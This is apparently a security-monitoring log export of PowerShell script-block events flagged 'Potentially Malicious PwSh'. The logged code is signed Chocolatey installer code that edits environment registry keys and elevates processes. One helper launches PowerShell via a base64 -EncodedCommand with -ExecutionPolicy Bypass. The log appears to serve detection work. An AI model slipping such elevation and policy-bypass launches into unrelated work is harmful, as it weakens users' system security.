[System.EnvironmentVariableTarget]::Process -or $Value -eq $null -or $Value -eq '') { return [Environment]::SetEnvironmentVariable($Name, $Value, $Scope) } [string]$keyHive = 'HKEY_LOCAL_MACHINE' [string]$registryKey = ""SYSTEM\CurrentControlSet\Control\Session Manager\Environment\"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($registryKey) if ($Scope -eq [System.EnvironmentVariableTarget]::User) { $keyHive = 'HKEY_CURRENT_USER' $registryKey = ""Environment"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($registryKey) } [Microsoft.Win32.RegistryValueKind]$registryType = [Microsoft.Win32.RegistryValueKind]::String try { if ($win32RegistryKey.GetValueNames() -contains $Name) { $registryType = $win32RegistryKey.GetValueKind($Name) } } catch { # the value doesn't yet exist # move along, nothing to see here } Write-Debug ""Registry type for $Name is/will be $registryType"" if ($Name -eq 'PATH') { $registryType = [Microsoft.Win32.RegistryValueKind]::ExpandString } [Microsoft.Win32.Registry]::SetValue($keyHive + ""\"" + $registryKey, $Name, $Value, $registryType) try { # make everything refresh # because sometimes explorer.exe just doesn't get the message that things were updated. if (-not (""win32.nativemethods"" -as [type])) { # import sendmessagetimeout from win32 add-type -Namespace Win32 -Name NativeMethods -MemberDefinition @"" [DllImport(""user32.dll"", SetLastError = true, CharSet = CharSet.Auto)] public static extern IntPtr SendMessageTimeout( IntPtr hWnd, uint Msg, UIntPtr wParam, string lParam, uint fuFlags, uint uTimeout, out UIntPtr lpdwResult); ""@ } $HWND_BROADCAST = [intptr]0xffff; $WM_SETTINGCHANGE = 0x1a; $result = [uintptr]::zero # notify all windows of environment block change [win32.nativemethods]::SendMessageTimeout($HWND_BROADCAST, $WM_SETTINGCHANGE, [uintptr]::Zero, ""Environment"", 2, 5000, [ref]$result) | Out-Null # Set a user environment variable making the system refresh $setx = ""$($env:SystemRoot)\System32\setx.exe"" & ""$setx"" ChocolateyLastPathUpdate `""$((Get-Date).ToFileTime())`"" | Out-Null } catch { Write-Warning ""Failure attempting to let Explorer know about updated environment settings.`n $($_.Exception.Message)"" } Update-SessionEnvironment } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBOu3ChoK62lTYZ # 9Y709GEKMD/ZFRQI2jbzh+hJKc5Y1KCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgPp4/Gnz1p2MhBlnpEil0vTWoLvzfKqLrdT9+ # qrHVL8MwDQYJKoZIhvcNAQEBBQAEggEAsmbFS+5MO59WHOwvtI/xhg/fORekpXCn # kDdVLu6caJVUh3BVk17uv3eFpYR/I4MU4W65maxIK7l9jhiGcxvF37E94lSqEtZc # LVN5m7dRjiLSSuv2NenuQLr3kIGhQeB4c/lwiZcRBf53ANdTwUbMwF9UtlARxq3R # Hn1/T4caGriEClaXY55qOw4PAxzJC/zze6SwXGarXTY0YyuOHYNZ+VutwOT3/Ilz # Q7kytjehIqtDUhuBZtgv6qdnwJyNJM40WOyVKyg71OFx8EwwuOJDyvy9poKmykuE # aPxVK+DRWgpSwjDy+PCjbbcNS8eaOiJS3uyswv1l6DqRzZ59H6PyaKGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzAwWjAjBgkqhkiG9w0BCQQxFgQUjP95hMVfZNWYfVjI # L9Cgest1f1MwDQYJKoZIhvcNAQEBBQAEggEALzknQ55rcp9crkxee1A87etbTGT+ # iJZqbaxZIe+Sj34Ml53OIqvMQj35ygkKq02ONTDQiK5EVlYLm8+1Dn/xPF0nanDt # SaihFMa2VKo3mcwDUy4E6vTUfmFrMpCcYXxmbYghGFQO7e6Izq+6UtQIG19mj8Hn # c+6wbmlKuqaJa2KFx5X2QFOoOP18QUeKxDZelbDClc6TRKIlMRuihofcRCByF2Bj # MNpDySXfRafleMS1EybFmmNVrdnaqx+ncCF1ud/niIEH1rAUb52RyPg+WiqGXtUB # PqBJonzDwmRxEvj/a6qYMM+neDEC+DjnSF0CtNZK1rW6MFDgHS+FFvv/kQ== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:49.466 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,89,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Start-ChocolateyProcessAsAdmin { <# .SYNOPSIS **NOTE:** Administrative Access Required. Runs a process with administrative privileges. If `-ExeToRun` is not specified, it is run with PowerShell. .NOTES This command will assert UAC/Admin privileges on the machine. Starting in 0.9.10, will automatically call Set-PowerShellExitCode to set the package exit code in the following ways: - 4 if the binary turns out to be a text file. - The same exit code returned from the process that is run. If a 3010 is returned, it will set 3010 for the package. Aliases `Start-ChocolateyProcess` and `Invoke-ChocolateyProcess` available in 0.10.2+. .INPUTS None .OUTPUTS None .PARAMETER Statements Arguments to pass to `ExeToRun` or the PowerShell script block to be run. .PARAMETER ExeToRun The executable/application/installer to run. Defaults to `'powershell'`. .PARAMETER Elevated Indicate whether the process should run elevated. Available in 0.10.2+. .PARAMETER Minimized Switch indicating if a Windows pops up (if not called with a silent argument) that it should be minimized. .PARAMETER NoSleep Used only when calling PowerShell - indicates the window that is opened should return instantly when it is complete. .PARAMETER ValidExitCodes Array of exit codes indicating success. Defaults to `@(0)`. .PARAMETER WorkingDirectory The working directory for the running process. Defaults to `Get-Location`. Available in 0.10.1+. .PARAMETER SensitiveStatements Arguments to pass to `ExeToRun` that are not logged. Note that only licensed versions of Chocolatey provide a way to pass those values completely through without having them in the install script or on the system in some way. Available in 0.10.1+. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE Start-ChocolateyProcessAsAdmin -Statements ""$msiArgs"" -ExeToRun 'msiexec' .EXAMPLE Start-ChocolateyProcessAsAdmin -Statements ""$silentArgs"" -ExeToRun $file .EXAMPLE Start-ChocolateyProcessAsAdmin -Statements ""$silentArgs"" -ExeToRun $file -ValidExitCodes @(0,21) .EXAMPLE > # Run PowerShell statements $psFile = Join-Path ""$(Split-Path -parent $MyInvocation.MyCommand.Definition)"" 'someInstall.ps1' Start-ChocolateyProcessAsAdmin ""& `'$psFile`'"" .EXAMPLE # This also works for cmd and is required if you have any spaces in the paths within your command $appPath = ""$env:ProgramFiles\myapp"" $cmdBatch = ""/c `""$appPath\bin\installmyappservice.bat`"""" Start-ChocolateyProcessAsAdmin $cmdBatch cmd # or more explicitly Start-ChocolateyProcessAsAdmin -Statements $cmdBatch -ExeToRun ""cmd.exe"" .LINK Install-ChocolateyPackage .LINK Install-ChocolateyInstallPackage #> param( [parameter(Mandatory=$false, Position=0)][string[]] $statements, [parameter(Mandatory=$false, Position=1)][string] $exeToRun = 'powershell', [parameter(Mandatory=$false)][switch] $elevated = $true, [parameter(Mandatory=$false)][switch] $minimized, [parameter(Mandatory=$false)][switch] $noSleep, [parameter(Mandatory=$false)] $validExitCodes = @(0), [parameter(Mandatory=$false)][string] $workingDirectory = $(Get-Location), [parameter(Mandatory=$false)][string] $sensitiveStatements = '', [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) [string]$statements = $statements -join ' ' Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $alreadyElevated = $false if (Test-ProcessAdminRights) { $alreadyElevated = $true } $dbMessagePrepend = ""Elevating permissions and running"" if (!$elevated) { $dbMessagePrepend = ""Running"" } try { if ($exeToRun -ne $null) { $exeToRun = $exeToRun -replace ""`0"", """" } if ($statements -ne $null) { $statements = $statements -replace ""`0"", """" } } catch { Write-Debug ""Removing null characters resulted in an error - $($_.Exception.Message)"" } if ($exeToRun -ne $null) { $exeToRun = $exeToRun.Trim().Trim(""'"").Trim('""') } $wrappedStatements = $statements if ($wrappedStatements -eq $null) { $wrappedStatements = ''} if ($exeToRun -eq 'powershell') { $exeToRun = ""$($env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe"" $importChocolateyHelpers = ""& import-module -name '$helpersPath\chocolateyInstaller.psm1' -Verbose:`$false | Out-Null;"" $block = @"" `$noSleep = `$$noSleep #`$env:ChocolateyEnvironmentDebug='false' #`$env:ChocolateyEnvironmentVerbose='false' $importChocolateyHelpers try{ `$progressPreference=""SilentlyContinue"" $statements if(!`$noSleep){start-sleep 6} } catch{ if(!`$noSleep){start-sleep 8} throw } ""@ $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($block)) $wrappedStatements = ""-NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -InputFormat Text -OutputFormat Text -EncodedCommand $encoded"" $dbgMessage = @"" $dbMessagePrepend powershell block: $block This may take a while, depending on the statements. ""@ } else { $dbgMessage = @"" $dbMessagePrepend [`""$exeToRun`"" $wrappedStatements]. This may take a while, depending on the statements. ""@ } Write-Debug $dbgMessage $exeIsTextFile = [System.IO.Path]::GetFullPath($exeToRun) + "".istext"" if ([System.IO.File]::Exists($exeIsTextFile)) { Set-PowerShellExitCode 4 throw ""The file was a text file but is attempting to be run as an executable - '$exeToRun'"" } if ($exeToRun -eq 'msiexec' -or $exeToRun -eq 'msiexec.exe') { $exeToRun = ""$($env:SystemRoot)\System32\msiexec.exe"" } if (!([System.IO.File]::Exists($exeToRun)) -and $exeToRun -notmatch 'msiexec') { Write-Warning ""May not be able to find '$exeToRun'. Please use full path for executables."" # until we have search paths enabled, let's just pass a warning #Set-PowerShellExitCode 2 #throw ""Could not find '$exeToRun'"" } # Redirecting output slows things down a bit. $writeOutput = { if ($EventArgs.Data -ne $null) { Write-Verbose ""$($EventArgs.Data)"" } } $writeError = { if ($EventArgs.Data -ne $null) { Write-Error ""$($EventArgs.Data)"" } } $process = New-Object System.Diagnostics.Process $process.EnableRaisingEvents = $true Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogOutput_ChocolateyProc"" -EventName OutputDataReceived -Action $writeOutput | Out-Null Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogErrors_ChocolateyProc"" -EventName ErrorDataReceived -Action $writeError | Out-Null #$process.StartInfo = New-Object System.Diagnostics.ProcessStartInfo($exeToRun, $wrappedStatements) # in case empty args makes a difference, try to be compatible with the older # version $psi = New-Object System.Diagnostics.ProcessStartInfo $psi.FileName = $exeToRun if ($wrappedStatements -ne '') { $psi.Arguments = ""$wrappedStatements"" } if ($sensitiveStatements -ne $null -and $sensitiveStatements -ne '') { Write-Host ""Sensitive arguments have been passed. Adding to arguments."" $psi.Arguments += "" $sensitiveStatements"" } $process.StartInfo = $psi # process start info $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.RedirectStandardError = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WorkingDirectory = $workingDirectory if ($elevated -and -not $alreadyElevated -and [Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)){ # this doesn't actually currently work - because we are not running under shell execute Write-Debug ""Setting RunAs for elevation"" $process.StartInfo.Verb = ""RunAs"" } if ($minimized) { $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Minimized } $process.Start() | Out-Null if ($process.StartInfo.RedirectStandardOutput) { $process.BeginOutputReadLine() } if ($process.StartInfo.RedirectStandardError) { $process.BeginErrorReadLine() } $process.WaitForExit() # For some reason this forces the jobs to finish and waits for # them to do so. Without this it never finishes. Unregister-Event -SourceIdentifier ""LogOutput_ChocolateyProc"" Unregister-Event -SourceIdentifier ""LogErrors_ChocolateyProc"" # sometimes the process hasn't fully exited yet. for ($loopCount=1; $loopCount -le 15; $loopCount++) { if ($process.HasExited) { break; } Write-Debug ""Waiting for process to exit - $loopCount/15 seconds""; Start-Sleep 1; } $exitCode = $process.ExitCode $process.Dispose() Write-Debug ""Command [`""$exeToRun`"" $wrappedStatements] exited with `'$exitCode`'."" $exitErrorMessage = '' $errorMessageAddendum = "" This is most likely an issue with the '$env:chocolateyPackageName' package and not with Chocolatey itself. Please follow up with the package maintainer(s) directly."" switch 